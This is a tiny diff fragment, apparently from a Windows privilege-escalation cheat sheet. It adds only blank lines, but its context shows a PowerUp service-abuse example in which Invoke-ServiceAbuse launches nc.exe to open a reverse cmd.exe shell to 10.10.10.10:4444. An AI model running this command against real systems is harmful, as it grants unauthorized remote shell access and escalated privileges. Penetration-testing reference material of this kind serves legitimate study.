@@ -26,3 +26,5 @@ AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
 # Automatic exploit
 Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
 ```
+
+
